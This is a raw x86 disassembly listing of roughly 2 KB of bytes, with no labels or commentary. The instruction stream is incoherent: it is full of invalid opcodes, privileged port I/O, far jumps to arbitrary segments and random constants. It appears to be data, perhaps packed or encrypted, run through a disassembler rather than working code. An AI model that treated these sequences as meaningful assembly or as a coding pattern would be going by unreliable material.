  41e7d4:	jno    0x41e7af
  41e7d6:	mov    ebp,edi
  41e7d8:	cmp    al,0x4
  41e7da:	lea    ecx,[ebp+0x31]
  41e7dd:	jl     0x3cc26ced
  41e7e3:	out    dx,al
  41e7e4:	mov    ah,0x68
  41e7e6:	pop    ebp
  41e7e7:	fisub  DWORD PTR [ecx+0x64dfec63]
  41e7ed:	(bad)  
  41e7ee:	in     al,dx
  41e7ef:	sahf   
  41e7f0:	test   al,0x70
  41e7f2:	push   ebx
  41e7f4:	leave  
  41e7f5:	or     DWORD PTR [edx+0x62],ecx
  41e7f8:	inc    eax
  41e7f9:	stc    
  41e7fa:	pop    ebp
  41e7fb:	or     dh,BYTE PTR [esi+esi*8]
  41e7fe:	jne    0x41e7ee
  41e800:	ret    
  41e801:	cwde   
  41e802:	pop    DWORD PTR [esi-0x47a99106]
  41e808:	int    0x90
  41e80a:	loop   0x41e7cc
  41e80c:	push   edx
  41e80d:	inc    ebx
  41e80e:	leave  
  41e80f:	mov    bh,0x34
  41e811:	sub    eax,0x37d046b7
  41e816:	fsubr  DWORD PTR [ecx]
  41e818:	pop    ebp
  41e819:	pusha  
  41e81a:	call   0x9570:0x5888aec
  41e821:	or     ebx,edx
  41e823:	aaa    
  41e824:	xor    edx,DWORD PTR [esi-0x4e]
  41e827:	cdq    
  41e828:	or     ecx,ecx
  41e82a:	in     eax,dx
  41e82b:	pop    ss
  41e82c:	cmp    bh,BYTE PTR [edx-0x5f]
  41e82f:	pop    ebp
  41e830:	jne    0x41e864
  41e832:	push   0xa57689a8
  41e837:	xchg   esi,eax
  41e838:	fwait
  41e839:	xchg   edx,eax
  41e83a:	mov    dh,0x51
  41e83c:	cmp    dh,0x85
  41e83f:	mov    eax,DWORD PTR [edi-0x2ecf67bf]
  41e845:	fistp  DWORD PTR [edi]
  41e847:	test   DWORD PTR [edi+0x59051560],edi
  41e84d:	fdivr  DWORD PTR [edi-0xd15d0e8]
  41e853:	hlt    
  41e854:	mov    ch,0x6e
  41e856:	in     al,dx
  41e857:	fcmovu st,st(2)
  41e859:	scas   eax,DWORD PTR es:[edi]
  41e85a:	push   ecx
  41e85b:	hlt    
  41e85c:	adc    ah,al
  41e85e:	and    DWORD PTR [ebx+0x7e],esp
  41e861:	or     BYTE PTR [ebp-0x37888f11],ah
  41e867:	push   ebx
  41e868:	push   edx
  41e869:	std    
  41e86a:	mov    gs,WORD PTR [esi+0x22]
  41e86d:	lods   al,BYTE PTR ds:[esi]
  41e86e:	sti    
  41e86f:	or     al,0xae
  41e871:	pop    ebx
  41e872:	jne    0x41e8ee
  41e874:	div    DWORD PTR [ecx-0x37bf85e0]
  41e87a:	out    0xd5,eax
  41e87c:	sub    ch,BYTE PTR [eax-0x5dbc614f]
  41e882:	mov    DWORD PTR [ebp-0x1eaea4c3],edi
  41e888:	cmp    eax,0x35e43ff9
  41e88d:	dec    edx
  41e88e:	pop    ds
  41e88f:	sbb    al,0x63
  41e891:	daa    
  41e892:	xchg   BYTE PTR [ecx+0x26ed4eca],cl
  41e898:	loop   0x41e906
  41e89a:	ret    
  41e89b:	jmp    0x547:0xfecd5b1d
  41e8a2:	aaa    
  41e8a3:	dec    esp
  41e8a4:	lods   eax,DWORD PTR ds:[esi]
  41e8a5:	ror    DWORD PTR [esi],cl
  41e8a7:	push   esi
  41e8a8:	push   0x47
  41e8aa:	sbb    eax,0x85134a90
  41e8af:	adc    edi,0xc906857b
  41e8b5:	cmp    bh,dl
  41e8b7:	inc    eax
  41e8b8:	lock mov esi,edi
  41e8bb:	stos   DWORD PTR es:[edi],eax
  41e8bc:	jp     0x41e8ff
  41e8be:	inc    eax
  41e8bf:	call   0x3227:0xa65aae0d
  41e8c6:	xchg   edi,eax
  41e8c7:	je     0x41e8e7
  41e8c9:	ins    BYTE PTR es:[edi],dx
  41e8ca:	pop    ds
  41e8cb:	jne    0x41e876
  41e8cd:	outs   dx,DWORD PTR ds:[esi]
  41e8ce:	and    ebp,DWORD PTR [ebp+esi*4-0x15]
  41e8d2:	int    0xdb
  41e8d4:	fcomp  QWORD PTR [ebx-0x4]
  41e8d7:	shl    BYTE PTR ds:0xd587cc26,1
  41e8dd:	loopne 0x41e8de
  41e8df:	xchg   esi,eax
  41e8e0:	mov    ecx,0x91c27703
  41e8e5:	mov    esi,0x44fe2fc0
  41e8ea:	or     ebx,ecx
  41e8ec:	mov    dl,0x50
  41e8ee:	jbe    0x41e8c8
  41e8f0:	add    cl,0x61
  41e8f3:	push   cs
  41e8f4:	sti    
  41e8f5:	(bad)  
  41e8f6:	pop    edx
  41e8f7:	aas    
  41e8f8:	add    ebx,esi
  41e8fa:	les    edi,FWORD PTR [edx]
  41e8fc:	mov    ecx,0x13be52a7
  41e901:	or     ebx,edx
  41e903:	jle    0x41e973
  41e905:	(bad)  
  41e906:	dec    ebx
  41e907:	mov    ch,0x2c
  41e909:	mov    esp,0x8890664f
  41e90e:	iret   
  41e90f:	cmp    DWORD PTR [ebx+0x7320a3e2],0xa
  41e916:	sahf   
  41e917:	in     eax,0x74
  41e919:	adc    ebp,ecx
  41e91b:	in     al,0x77
  41e91d:	or     edi,DWORD PTR ds:0xf0f22237
  41e923:	push   eax
  41e924:	pop    ebx
  41e925:	pop    ss
  41e926:	sub    esi,DWORD PTR [ecx]
  41e928:	cmp    BYTE PTR [esp+edi*8+0x6a],dl
  41e92c:	mov    BYTE PTR [edx],bl
  41e92e:	ds xchg ebp,eax
  41e930:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e931:	adc    eax,0xf754785d
  41e936:	add    eax,0xa62050cc
  41e93b:	inc    esp
  41e93c:	sahf   
  41e93d:	sbb    ch,BYTE PTR [esp+ebp*8-0x43]
  41e941:	inc    ebx
  41e942:	xor    bl,cl
  41e944:	mov    BYTE PTR [eax-0x50],dh
  41e947:	push   ebp
  41e948:	pop    DWORD PTR [edi]
  41e94a:	daa    
  41e94b:	cmp    ebx,esi
  41e94d:	xchg   esp,eax
  41e94e:	mov    bh,0xf6
  41e950:	pop    eax
  41e951:	mov    ds:0xd3e27ae5,eax
  41e956:	mov    ebx,0x80379020
  41e95b:	mov    edi,0x8874b38b
  41e960:	sbb    ebp,DWORD PTR [esi+0x72154499]
  41e966:	or     eax,0x8fe3eb24
  41e96b:	sub    BYTE PTR [ebx+eiz*2-0x2c],dl
  41e96f:	and    eax,0x257bbd38
  41e974:	mov    edi,0x83491962
  41e979:	cmp    BYTE PTR [edi],0xf6
  41e97c:	cmp    al,0x45
  41e97e:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41e980:	sbb    eax,0xc958087
  41e985:	shl    DWORD PTR [ebx-0x5d874bc1],0xbb
  41e98c:	mov    eax,0x7e30b000
  41e991:	sub    eax,0x617930e6
  41e996:	clc    
  41e997:	jne    0x41e929
  41e999:	adc    DWORD PTR [eax-0x4d6e9d15],eax
  41e99f:	sub    DWORD PTR [esi-0x3c],edi
  41e9a2:	push   0xffffffb5
  41e9a4:	je     0x41e9ef
  41e9a6:	and    edx,ecx
  41e9a8:	rol    DWORD PTR [edi],1
  41e9aa:	pop    es
  41e9ab:	(bad)  
  41e9ac:	xor    cl,BYTE PTR [eax-0x52f75086]
  41e9b2:	std    
  41e9b3:	push   edi
  41e9b4:	nop
  41e9b5:	mov    edi,0x90cc9219
  41e9ba:	xor    eax,0xaa7fb3f7
  41e9bf:	call   0xdbb8f82
  41e9c4:	jg     0x41e9f7
  41e9c6:	dec    eax
  41e9c7:	fsubr  DWORD PTR [esi]
  41e9c9:	cmc    
  41e9ca:	lahf   
  41e9cb:	xor    al,0x2a
  41e9cd:	sub    DWORD PTR [eax],esp
  41e9cf:	and    al,0xf3
  41e9d2:	pusha  
  41e9d3:	hlt    
  41e9d4:	sub    DWORD PTR gs:[eax-0x30],0x7
  41e9d9:	je     0x41e974
  41e9db:	js     0x41e9cd
  41e9dd:	mul    DWORD PTR [ecx-0x73]
  41e9e0:	add    ah,BYTE PTR [ebp-0x29d71f17]
  41e9e6:	cli    
  41e9e7:	dec    ebp
  41e9e8:	div    ecx
  41e9ea:	call   0x7f24:0xe4d6792d
  41e9f1:	jecxz  0x41ea0b
  41e9f3:	mov    al,ds:0x74bf5265
  41e9f8:	jnp    0x41e983
  41e9fa:	imul   esi,ebp,0xc9073820
  41ea00:	cmp    ch,dh
  41ea02:	pop    eax
  41ea03:	daa    
  41ea04:	repnz stc 
  41ea06:	dec    ebp
  41ea07:	(bad)  [eax]
  41ea09:	mov    eax,0x321c891f
  41ea0e:	shl    BYTE PTR [ebx+0x4a],cl
  41ea11:	push   ebp
  41ea12:	cmp    BYTE PTR [eax+0x14],bl
  41ea15:	pop    ebp
  41ea16:	pop    ecx
  41ea17:	jg     0x41e9d2
  41ea19:	aad    0x37
  41ea1b:	pop    esp
  41ea1c:	jb     0x41e9f7
  41ea1e:	add    BYTE PTR [edi],0xc2
  41ea21:	adc    cl,al
  41ea23:	ins    DWORD PTR es:[edi],dx
  41ea24:	mov    ebp,DWORD PTR [edi+0x3bc00a08]
  41ea2a:	mov    DWORD PTR [edx-0x18],ebx
  41ea2d:	or     eax,0xe92f8b66
  41ea32:	pop    esi
  41ea33:	mov    esp,0x3bda6b11
  41ea38:	repnz das 
  41ea3a:	ins    DWORD PTR es:[edi],dx
  41ea3b:	ss shl dh,cl
  41ea3e:	mov    al,0x7
  41ea40:	xor    al,0xa4
  41ea42:	(bad)  
  41ea43:	push   eax
  41ea44:	mov    DWORD PTR [ecx],edx
  41ea46:	fimul  DWORD PTR [ebp+edx*8-0x2a]
  41ea4a:	std    
  41ea4b:	in     eax,0x5f
  41ea4d:	sub    ah,BYTE PTR [ebp-0x57]
  41ea50:	frstor [ecx+0x33bc35f1]
  41ea56:	lods   al,BYTE PTR ds:[esi]
  41ea57:	mov    ds:0x1bf377d3,al
  41ea5c:	outs   dx,BYTE PTR ds:[esi]
  41ea5d:	fild   DWORD PTR [ebp-0x6e]
  41ea60:	pop    esi
  41ea61:	mov    ecx,fs
  41ea63:	(bad)  
  41ea64:	push   edi
  41ea65:	in     al,0xf0
  41ea67:	and    eax,0x2cb76cda
  41ea6c:	and    al,0xd7
  41ea6e:	pop    esp
  41ea6f:	jne    0x41ea73
  41ea71:	lods   al,BYTE PTR ds:[esi]
  41ea72:	cdq    
  41ea73:	xchg   ah,dh
  41ea75:	loopne 0x41ea1d
  41ea77:	and    BYTE PTR [edx-0x58],ch
  41ea7a:	mov    ds:0x89237063,al
  41ea7f:	adc    ah,cl
  41ea81:	mov    ch,0x39
  41ea83:	dec    edx
  41ea84:	imul   esp,DWORD PTR [eax+0x36fbbad],0x4a
  41ea8b:	push   edx
  41ea8c:	repz pop eax
  41ea8e:	sbb    ebx,DWORD PTR [edi+ecx*8-0x19085e07]
  41ea95:	jl     0x41ea40
  41ea97:	retf   
  41ea98:	int    0x25
  41ea9a:	dec    esi
  41ea9b:	adc    BYTE PTR [edx+ebp*2-0x51],cl
  41ea9f:	inc    edi
  41eaa0:	push   0x72
  41eaa2:	jle    0x41eacb
  41eaa4:	fbstp  TBYTE PTR [edx]
  41eaa6:	jb     0x41ea6f
  41eaa8:	push   cs
  41eaa9:	lds    eax,FWORD PTR [ebx+0x3d]
  41eaac:	xchg   eax,eax
  41eaae:	push   ds
  41eaaf:	jnp    0x41eb19
  41eab1:	scas   al,BYTE PTR es:[edi]
  41eab2:	out    dx,al
  41eab3:	das    
  41eab4:	adc    dh,BYTE PTR [ebx-0xa]
  41eab7:	cmc    
  41eab8:	dec    ecx
  41eab9:	mov    ds:0xd819f06a,al
  41eabe:	and    al,0xd2
  41eac0:	ss cmp eax,0xfca7e74e
  41eac6:	push   esp
  41eac7:	mov    bh,0x8d
  41eac9:	xor    ch,BYTE PTR [ecx+0x7]
  41eacc:	dec    eax
  41eacd:	inc    cl
  41eacf:	aad    0xd9
  41ead1:	add    ecx,DWORD PTR [ebx]
  41ead3:	dec    esi
  41ead4:	fchs   
  41ead6:	xchg   edx,eax
  41ead7:	(bad)
  41eada:	lahf   
  41eadb:	mov    al,ds:0x8e810929
  41eae0:	mov    eax,ds:0x2c4d0565
  41eae5:	mov    ebp,0x1253cd9c
  41eaea:	jp     0x41eb31
  41eaec:	shl    BYTE PTR [esi+0x3b],1
  41eaef:	mov    ebp,0x800074ac
  41eaf4:	inc    ecx
  41eaf5:	inc    ebp
  41eaf6:	mov    ds:0x293bcd5f,eax
  41eafb:	loopne 0x41eb55
  41eafd:	xor    cl,BYTE PTR [edx-0x8]
  41eb00:	mov    al,0xa2
  41eb02:	call   0x88b3:0x53177980
  41eb09:	aam    0x1b
  41eb0b:	jbe    0x41eb6b
  41eb0d:	sub    ebx,DWORD PTR [ebp-0x12]
  41eb10:	fstp   TBYTE PTR gs:[ebx+0x6a]
  41eb14:	sub    BYTE PTR [esp+esi*4+0x5f631620],0xd3
  41eb1c:	outs   dx,BYTE PTR ds:[esi]
  41eb1d:	scas   eax,DWORD PTR es:[edi]
  41eb1e:	dec    ecx
  41eb1f:	in     eax,dx
  41eb20:	fldcw  WORD PTR [eax+0x51]
  41eb23:	lods   al,BYTE PTR ds:[esi]
  41eb24:	and    bh,dl
  41eb26:	pop    ebx
  41eb27:	mov    edx,0xd418bbec
  41eb2c:	inc    esp
  41eb2d:	jns    0x41eb16
  41eb2f:	jno    0x41ead6
  41eb31:	fcomi  st,st(1)
  41eb33:	push   ds
  41eb34:	mov    cl,0xc3
  41eb36:	adc    dh,BYTE PTR [edi-0x79]
  41eb39:	aad    0x71
  41eb3b:	in     eax,dx
  41eb3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb3d:	sub    ecx,DWORD PTR [esi+0x18]
  41eb40:	ret    
  41eb41:	mov    esp,0xe0feab98
  41eb46:	jge    0x41eadb
  41eb48:	outs   dx,DWORD PTR ds:[esi]
  41eb49:	mov    eax,0xf8bb9da7
  41eb4e:	push   0xffffffae
  41eb50:	lock pop eax
  41eb52:	mov    ebp,0x2fb5474
  41eb57:	cs xor al,dl
  41eb5a:	mov    al,BYTE PTR [ecx+esi*8]
  41eb5d:	jle    0x41eaf6
  41eb5f:	lea    esi,[edx-0x5f]
  41eb62:	mov    al,0x4b
  41eb64:	dec    edx
  41eb65:	or     ecx,DWORD PTR [ecx+0x6bfdfde0]
  41eb6b:	outs   dx,DWORD PTR ds:[esi]
  41eb6c:	ror    esi,1
  41eb6e:	push   edi
  41eb6f:	les    edx,FWORD PTR ds:[edi+0x7d]
  41eb73:	out    dx,eax
  41eb74:	into   
  41eb75:	inc    edx
  41eb76:	mov    eax,ds:0x2f789d8
  41eb7b:	xor    eax,0xc23619fb
  41eb80:	lock add BYTE PTR [ebx+0x1f1a0d60],bh
  41eb87:	sub    al,0xb8
  41eb89:	rol    DWORD PTR [ebp+0x59],0xcb
  41eb8d:	mov    DWORD PTR [ecx-0x68],edx
  41eb90:	cmp    al,0x8
  41eb92:	pop    ds
  41eb93:	test   eax,0xe0337647
  41eb98:	sbb    eax,0xa0067534
  41eb9d:	add    eax,0x2e285a02
  41eba2:	mov    edx,0x7ccbac24
  41eba7:	rcl    DWORD PTR [esi-0x78ca441],cl
  41ebad:	test   al,dh
  41ebaf:	sub    al,0xac
  41ebb1:	clc    
  41ebb2:	inc    edx
  41ebb3:	enter  0xa38f,0x7f
  41ebb7:	mov    esp,0x58a844b6
  41ebbc:	push   esi
  41ebbd:	or     DWORD PTR [eax],esp
  41ebbf:	adc    BYTE PTR [ebx+0x54c7ed55],0x73
  41ebc6:	in     eax,0x13
  41ebc8:	jge    0x41ebc5
  41ebca:	jmp    0x153a:0xc3049d81
  41ebd1:	jns    0x41ec1b
  41ebd3:	lea    esp,[edx]
  41ebd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebd6:	push   ebx
  41ebd7:	xchg   bh,dl
  41ebd9:	adc    eax,0xaf0d213b
  41ebde:	retf   0x737f
  41ebe1:	mov    al,0x69
  41ebe3:	(bad)  
  41ebe4:	cmc    
  41ebe5:	div    dl
  41ebe7:	fwait
  41ebe8:	(bad)  
  41ebe9:	sbb    dl,dh
  41ebeb:	sbb    eax,0xabde18e4
  41ebf0:	mov    dh,0xbb
  41ebf2:	push   esp
  41ebf3:	inc    ecx
  41ebf4:	cmc    
  41ebf5:	jl     0x41ec3a
  41ebf7:	lds    ebp,FWORD PTR [esp+edx*8]
  41ebfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebfb:	push   es
  41ebfc:	xchg   ebx,eax
  41ebfd:	or     edi,DWORD PTR [ecx+0x5c]
  41ec00:	lods   eax,DWORD PTR ds:[esi]
  41ec01:	jp     0x41ec54
  41ec03:	and    eax,DWORD PTR [edx+eiz*1-0x3cbbf8af]
  41ec0a:	sub    ch,dh
  41ec0c:	mov    esi,0x4165ecd3
  41ec11:	lds    edi,FWORD PTR [eax-0x37e537d8]
  41ec17:	pop    ecx
  41ec18:	scas   eax,DWORD PTR es:[edi]
  41ec19:	(bad)  
  41ec1a:	fucomi st,st(7)
  41ec1c:	jns    0x41ec14
  41ec1e:	adc    ecx,0x295e75f1
  41ec24:	call   0x77e9f40e
  41ec29:	xchg   ebx,eax
  41ec2a:	push   cs
  41ec2b:	mov    ch,0x1b
  41ec2d:	cwde   
  41ec2e:	or     al,0x7
  41ec30:	loope  0x41ebbc
  41ec32:	or     DWORD PTR [esi+edi*1],edi
  41ec35:	popf   
  41ec36:	retf   
  41ec37:	lea    edx,[esi]
  41ec39:	pop    ebp
  41ec3a:	mov    eax,ds:0x1f79d87
  41ec3f:	lea    esi,[eax]
  41ec41:	pop    ecx
  41ec42:	xchg   esp,eax
  41ec43:	movd   DWORD PTR [edi+ebp*8],mm1
  41ec47:	popa   
  41ec48:	mov    ?,WORD PTR [ecx]
  41ec4a:	sub    al,0x1f
  41ec4c:	jle    0x41ec11
  41ec4e:	mov    al,0xb4
  41ec50:	cmp    BYTE PTR [ecx],ah
  41ec52:	dec    ecx
  41ec53:	nop
  41ec54:	cmp    DWORD PTR [ebx-0x3b59b014],edx
  41ec5a:	sub    DWORD PTR [ebx],esp
  41ec5c:	(bad)  
  41ec5d:	stos   BYTE PTR es:[edi],al
  41ec5e:	imul   ebp,DWORD PTR [ebx+0x42],0xed31e038
  41ec65:	popa   
  41ec66:	xlat   BYTE PTR ds:[ebx]
  41ec67:	daa    
  41ec68:	push   DWORD PTR [esi]
  41ec6a:	push   0x32adfb05
  41ec6f:	jp     0x41ece5
  41ec71:	ins    BYTE PTR es:[edi],dx
  41ec72:	aas    
  41ec73:	in     eax,dx
  41ec74:	jns    0x41ec7d
  41ec76:	repz lahf 
  41ec78:	xor    eax,0x233ceb93
  41ec7d:	jecxz  0x41eca2
  41ec7f:	cmc    
  41ec80:	mov    ah,0x78
  41ec82:	mov    eax,0x63e96699
  41ec87:	sbb    WORD PTR [esi-0x31],cx
  41ec8b:	lds    edx,FWORD PTR [ecx+0x6eaeb5d]
  41ec91:	out    0x7d,eax
  41ec93:	sbb    DWORD PTR [ebx],0x69997c6
  41ec99:	ror    DWORD PTR [ebp-0x37ea90a7],1
  41ec9f:	loope  0x41ec81
  41eca1:	adc    ebp,DWORD PTR [ecx+0x3e]
  41eca4:	imul   eax,DWORD PTR [eax],0x72bd8019
  41ecaa:	mov    al,0xc8
  41ecac:	or     dh,ch
  41ecae:	mov    eax,ds:0xe9deac7c
  41ecb3:	jo     0x41ed2d
  41ecb5:	add    BYTE PTR ds:0xbbcd492c,bh
  41ecbb:	mov    ds:0x51a83380,eax
  41ecc0:	push   edi
  41ecc1:	push   0x8c639e1b
  41ecc6:	shr    edx,0x67
  41ecc9:	mov    ebp,DWORD PTR [ecx-0x18]
  41eccc:	outs   dx,DWORD PTR ds:[esi]
  41eccd:	push   ds
  41ecce:	test   dh,dh
  41ecd0:	push   edx
  41ecd1:	xchg   edi,eax
  41ecd2:	mov    dh,BYTE PTR [esi+ecx*8-0x4ddc3fde]
  41ecd9:	mov    edx,0x5d5f8eff
  41ecde:	xchg   ebp,eax
  41ecdf:	mov    edi,0x12bfe6bc
  41ece4:	sub    ch,al
  41ece6:	ret    0x371d
  41ece9:	or     al,0x6b
  41eceb:	pop    DWORD PTR [edi+0x7efe66ec]
  41ecf1:	cmp    esi,DWORD PTR [eax]
  41ecf3:	(bad)  
  41ecf4:	cmp    BYTE PTR [ecx],0x53
  41ecf7:	jg     0x41ecd5
  41ecf9:	call   0x63e7:0xd1033cb3
  41ed00:	lock lods al,BYTE PTR ds:[esi]
  41ed02:	jae    0x41ed74
  41ed04:	and    BYTE PTR [eax-0x78],dh
  41ed07:	jns    0x41ed47
  41ed09:	into   
  41ed0a:	fldln2 
  41ed0c:	popa   
  41ed0d:	fist   WORD PTR [eax+0x46639038]
  41ed13:	iret   
  41ed14:	lods   eax,DWORD PTR ds:[esi]
  41ed15:	stos   DWORD PTR es:[edi],eax
  41ed16:	mov    dl,0x1f
  41ed18:	jge    0x41ed49
  41ed1a:	je     0x41ed73
  41ed1c:	push   ds
  41ed1d:	cmp    al,0x97
  41ed1f:	push   0xffffffe5
  41ed21:	pusha  
  41ed22:	xchg   ebp,eax
  41ed23:	and    eax,0x43cc8b90
  41ed28:	pop    edi
  41ed29:	stos   DWORD PTR es:[edi],eax
  41ed2a:	add    BYTE PTR [eax],dh
  41ed2c:	daa    
  41ed2d:	cmp    al,BYTE PTR [ebx+ecx*8]
  41ed30:	repz imul DWORD PTR [ebx-0x22]
  41ed34:	retf   0xcd8e
  41ed37:	mov    bl,0xda
  41ed39:	xor    al,dl
  41ed3b:	and    edx,DWORD PTR [ebp-0x43d940f3]
  41ed41:	out    dx,al
  41ed42:	jp     0x41ed3c
  41ed44:	pop    esp
  41ed45:	outs   dx,BYTE PTR ds:[esi]
  41ed46:	pop    ebp
  41ed47:	mov    esi,0x711fa770
  41ed4c:	mov    ebp,0x40e3ed1
  41ed51:	les    ecx,FWORD PTR [esi+0x65]
  41ed54:	push   ss
  41ed55:	aas    
  41ed56:	add    BYTE PTR [eax+ebp*8+0x20],bl
  41ed5a:	clc    
  41ed5b:	add    BYTE PTR [ebx-0x635e528d],al
  41ed61:	or     ebp,DWORD PTR [esi]
  41ed63:	aaa    
  41ed64:	mov    bh,0xe3
  41ed66:	mov    edi,DWORD PTR [ecx]
  41ed68:	or     BYTE PTR [edi+0x47],al
  41ed6b:	pusha  
  41ed6c:	(bad)  
  41ed6d:	leave  
  41ed6e:	mov    dh,0x66
  41ed70:	int    0xc5
  41ed72:	inc    ebx
  41ed73:	inc    ebx
  41ed74:	clc    
  41ed75:	jp     0x41edbf
  41ed77:	sub    al,0x33
  41ed79:	sbb    esp,ebp
  41ed7b:	mov    ds:0xf83ec635,al
  41ed80:	out    dx,eax
  41ed81:	xor    al,0xe8
  41ed83:	jne    0x41edb1
  41ed85:	mov    ss,esi
  41ed87:	xchg   ebp,eax
  41ed88:	adc    bh,BYTE PTR [esi+0x5eedf0ad]
  41ed8e:	or     ch,BYTE PTR [ebx-0x71]
  41ed91:	jo     0x41ed5a
  41ed93:	adc    dh,0x4c
  41ed96:	frstor [ebp-0x3c]
  41ed99:	enter  0x67d8,0x10
  41ed9d:	data16 xlat BYTE PTR ds:[ebx]
  41ed9f:	and    ebp,ecx
  41eda1:	int3   
  41eda2:	inc    edi
  41eda3:	in     al,0xf8
  41eda5:	or     DWORD PTR [eax+0x7f],esp
  41eda8:	pop    ecx
  41eda9:	mov    bh,0xee
  41edab:	div    DWORD PTR [ebx]
  41edad:	ins    BYTE PTR es:[edi],dx
  41edae:	je     0x41ee0b
  41edb0:	xchg   ebx,eax
  41edb1:	or     dl,ah
  41edb3:	xor    ebx,DWORD PTR [edi+0x5]
  41edb6:	shl    BYTE PTR [ecx],1
  41edb8:	test   al,0xa
  41edba:	in     eax,0xcb
  41edbc:	loopne 0x41edc0
  41edbe:	loop   0x41edcc
  41edc0:	mov    ah,0x44
  41edc2:	lock lahf 
  41edc4:	pop    edi
  41edc5:	mov    edx,0x5eba5df4
  41edca:	outs   dx,BYTE PTR ds:[esi]
  41edcb:	pop    ecx
  41edcc:	arpl   WORD PTR [edx+0x3e],ax
  41edcf:	jne    0x41ee1a
  41edd1:	(bad)
  41edd5:	sub    ecx,0x38
  41edd8:	mov    ds:0xc00db00b,eax
  41eddd:	hlt    
  41edde:	inc    edx
  41eddf:	(bad)  
  41ede0:	int    0xdb
  41ede2:	shr    edx,0x33
  41ede5:	push   eax
  41ede6:	fwait
  41ede7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ede8:	bound  ebx,QWORD PTR [eax+0x5bb22c91]
  41edee:	sbb    DWORD PTR ds:0xfbd60932,eax
  41edf4:	mov    eax,ds:0x52900e68
  41edf9:	int    0xb5
  41edfb:	ss hlt 
  41edfd:	ins    DWORD PTR es:[edi],dx
  41edfe:	aad    0x5f
  41ee00:	push   0x4d
  41ee02:	mov    ebx,0xea6fa135
  41ee07:	rol    BYTE PTR [ebx+edx*2],1
  41ee0a:	shl    BYTE PTR [esi+0x3563002],0x2b
  41ee11:	loop   0x41edc5
  41ee13:	pop    ds
  41ee14:	push   ebp
  41ee15:	in     eax,dx
  41ee16:	pop    ds
  41ee17:	ss ins BYTE PTR es:[edi],dx
  41ee19:	push   esi
  41ee1a:	sub    ah,BYTE PTR [ebp+0x68b48c5c]
  41ee20:	(bad)  
  41ee21:	stc    
  41ee22:	sbb    al,0x7c
  41ee24:	dec    edx
  41ee25:	xchg   ebx,eax
  41ee26:	data16 xor dl,BYTE PTR [esi-0x172e4f92]
  41ee2d:	and    DWORD PTR [esi+edx*2+0x126e4fe0],ebp
  41ee34:	dec    eax
  41ee36:	sbb    al,0x5a
  41ee38:	mov    BYTE PTR [ebp+0x2e5bb80c],dh
  41ee3e:	mov    WORD PTR [ebx+0x21],ss
  41ee41:	out    0x44,al
  41ee43:	xchg   BYTE PTR [bx+si],dh
  41ee46:	jmp    0xcf28:0x7b21a82f
  41ee4d:	ja     0x41ee4f
  41ee4f:	or     dl,dl
  41ee51:	push   eax
  41ee52:	mov    ebp,0x4c2a984
  41ee57:	std    
  41ee58:	dec    edi
  41ee59:	push   0x1eb8aedf
  41ee5e:	aas    
  41ee5f:	push   ds
  41ee60:	arpl   WORD PTR [edi-0x5c],cx
  41ee63:	fst    DWORD PTR [esi-0x290bdbbe]
  41ee69:	xchg   ebp,eax
  41ee6a:	scas   eax,DWORD PTR es:[edi]
  41ee6b:	cld    
  41ee6c:	fisubr WORD PTR [ecx]
  41ee6e:	ja     0x41eec4
  41ee70:	cmp    cl,dh
  41ee72:	mov    ds:0xe77c8c0,al
  41ee77:	or     ecx,DWORD PTR [eax]
  41ee79:	loope  0x41eeba
  41ee7b:	arpl   WORD PTR [eax+0x61],bp
  41ee7e:	mov    dl,BYTE PTR [ebx-0x27]
  41ee81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee83:	das    
  41ee84:	xchg   esi,eax
  41ee85:	jbe    0x41ee0b
  41ee87:	lods   eax,DWORD PTR ds:[esi]
  41ee88:	sub    al,0xa4
  41ee8a:	sub    esi,esp
  41ee8c:	jns    0x41eec6
  41ee8e:	xchg   edx,eax
  41ee8f:	jo     0x41eeb6
  41ee91:	repz sbb edi,esi
  41ee94:	(bad)  
  41ee95:	out    dx,al
  41ee96:	and    al,BYTE PTR [esi-0x52]
  41ee99:	loope  0x41ee6d
  41ee9b:	ret    
  41ee9c:	push   esp
  41ee9d:	inc    DWORD PTR [ebx-0x80]
  41eea0:	jmp    0x41ee79
  41eea2:	mov    BYTE PTR [edi+0xd2881bf],dl
  41eea8:	jle    0x41eecd
  41eeaa:	fwait
  41eeab:	xor    edx,DWORD PTR [edx-0x4a83cb35]
  41eeb1:	scas   eax,DWORD PTR es:[edi]
  41eeb2:	adc    eax,DWORD PTR [esi+0x674ea173]
  41eeb8:	(bad)  
  41eeb9:	fldenv [eax]
  41eebb:	sbb    DWORD PTR [ebx-0x426d4995],edx
  41eec1:	cmc    
  41eec2:	push   ebp
  41eec3:	mov    ah,0x9b
  41eec5:	pop    ecx
  41eec6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eec7:	jb     0x41ee4d
  41eec9:	jo     0x41eeb8
  41eecb:	mov    al,0x14
  41eecd:	sbb    DWORD PTR [ebx+0x9d30faa],eax
  41eed3:	aaa    
  41eed4:	out    0xd,al
  41eed6:	test   BYTE PTR [edi],dl
  41eed8:	fs mov bh,0x38
  41eedb:	jmp    0x4405afcd
  41eee0:	sub    al,BYTE PTR [eax]
  41eee2:	add    edi,edi
  41eee4:	dec    ebx
  41eee5:	icebp  
  41eee6:	lock xor al,0x60
  41eee9:	sub    ebp,eax
  41eeeb:	in     eax,0xe3
  41eeed:	xor    eax,0xdc7773af
  41eef3:	cld    
  41eef4:	jne    0x41eea6
  41eef6:	mov    bl,0xe2
  41eef8:	loope  0x41ef56
  41eefa:	dec    edx
  41eefb:	mov    ecx,0xd3e98b3e
  41ef00:	fcmovnbe st,st(0)
  41ef02:	mov    ebx,0x74838aa5
  41ef07:	and    BYTE PTR [ecx],ah
  41ef09:	std    
  41ef0a:	ret    0x5b97
  41ef0d:	cld    
  41ef0e:	mov    esi,0xc3c4f25b
  41ef13:	cli    
  41ef14:	push   0xffffffe9
  41ef16:	scas   eax,DWORD PTR es:[edi]
  41ef17:	xor    ebp,DWORD PTR [esi]
  41ef19:	or     DWORD PTR [ebx+0xdf1c],ebp
  41ef1f:	mov    ds:0xe0d0643c,al
  41ef24:	icebp  
  41ef25:	pop    edi
  41ef26:	push   cs
  41ef27:	inc    ecx
  41ef28:	cmp    edx,esp
  41ef2a:	inc    eax
